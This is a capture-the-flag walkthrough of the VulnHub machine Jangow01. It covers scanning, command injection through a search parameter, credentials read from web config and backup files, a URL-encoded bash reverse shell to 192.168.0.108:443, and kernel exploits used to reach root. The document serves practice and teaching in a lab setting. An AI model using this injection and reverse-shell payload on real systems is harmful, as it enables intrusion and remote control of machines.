# Jangow01 — Writeup

**Machine URL:** [Jangow — VulnHub entry](https://www.vulnhub.com/entry/jangow-101,754/)

---

## Tools used
- [linPEAS (PEASS-ng)](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [Exploit-DB: 45010](https://www.exploit-db.com/downloads/45010)
- [Exploit-DB raw/40839](https://www.exploit-db.com/raw/40839)



------------




## Enumeration 

Launched Jangow01 on virtualbox
<img src="Assets/image1.png" width="1000">

Started to scan ip adress with Nmap. 21 (FTP) and 80 (http) are open
<img src="Assets/image2.png" width="1000">

FTP port is password required, user unknown so i didnt start a bruteforce
<img src="Assets/image3.png" width="1000">

Brutedforced subdomains with tool called "dirb"
<img src="Assets/image4.png" width="1000">

Connected to http://192.168.0.116/ through firefox browser 
<img src="Assets/image5.png" width="1000">

found this website on those port
<img src="Assets/image6.png" width="1000">

Started too look around domains that i bruteforced through dirb
<img src="Assets/image7.png" width="1000">
<img src="Assets/image8.png" width="1000">


Found this page, got interested in "Email adress" because i can get a shell with it 
<img src="Assets/image9.png" width="1000">

Nothing worked, so i continued clicking around the website and found 
"http://192.168.0.119/site/busque.php?buscar=" this link. 
Started to think about command injection 
<img src="Assets/image10.png" width="1000">

added "ls" to "http://192.168.0.119/site/busque.php?buscar=" ( http://192.168.0.119/site/busque.php?buscar=ls in total ) and it worked, i saw all the directories
<img src="Assets/image11.png" width="1000">

wrote ls -al wordpress and saw config.php
<img src="Assets/image12.png" width="1000">

got into config.php and saw all these information 
<img src="Assets/image13.png" width="1000">

tried to connect "ftp" with those credentials but nothing worked
<img src="Assets/image14.png" width="1000">

looked at the hidden files of var/www/html with "ls -al /var/www/html" command and found ".backup" file
<img src="Assets/image15.png" width="1000">

found more credentials when i checked .backup file
<img src="Assets/image16.png" width="1000">

$servername = "localhost"; $database = "jangow01"; $username = "jangow01"; $password = "abygurl69"; // Create connection $conn = mysqli_connect($servername, $username, $password, $database); // Check connection if (!$conn) { die("Connection failed: " . mysqli_connect_error()); } echo "Connected successfully"; mysqli_close($conn);

tried to get ftp access with those credentials and it worked
<img src="Assets/image17.png" width="1000">

Got into home directory, found jangow01 folder. Than i found "user.txt". downloaded it and saw this text inside:
d41d8cd98f00b204e9800998ecf8427e

looks like hash
<img src="Assets/image18.png" width="1000">

couldnt crack it
<img src="Assets/image19.png" width="1000">


## Exploitation

tried to upload "php" reverseshell. but couldnt do that because user "jangow01" dont have rights to upload files to ftp server
<img src="Assets/image20.png" width="1000">

tried to insert bash reverse shell on website, it also didnt work 
<img src="Assets/image21.png" width="1000">

encoded a bash script through url encoder because bosquet saw it as string. and after pasting the encoded url - i got shell through 443 port 
<img src="Assets/image22.png" width="1000">
<img src="Assets/image23.png" width="1000">

192.168.0.119/site/busque.php?buscar=%2Fbin%2Fbash -c 'bash -i >%26 %2Fdev%2Ftcp%2F192.168.0.108%2F443 0>%261'

## Privilege escalation

Put the linpeas.sh script on ftp server
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
<img src="Assets/image24.png" width="1000">

created new tty with python3 ( lucky that machine had python3 ), and switched to the user called jangow01 because previous user couldnt execute commands
<img src="Assets/image25.png" width="1000">

changed linpeas.sh rights to execute it
<img src="Assets/image26.png" width="1000">

launched linpeas.sh
<img src="Assets/image27.png" width="1000">

found out that this machine is vulnerable to this exploit, its avaliable on github
<img src="Assets/image28.png" width="1000">

wanted to find this exploit on "metasploit" but failed, so i will exploit it manually
<img src="Assets/image29.png" width="1000">

uploaded script on FTP server
<img src="Assets/image30.png" width="1000">

changed rights of dirtycow
<img src="Assets/image31.png" width="1000">

unsuccessful, understood that i need interpretator to launch this script
<img src="Assets/image32.png" width="1000">

compiled dirtycow
<img src="Assets/image33.png" width="1000">

understood that dirtycow is not exploit that i need
<img src="Assets/image34.png" width="1000">

found this exploit
<img src="Assets/image36.png" width="1000">

made the same steps and compiled exploits
<img src="Assets/image37.png" width="1000">

gained root with this exploit
<img src="Assets/image38.png" width="1000">

Found the flag
<img src="Assets/image39.png" width="1000">



















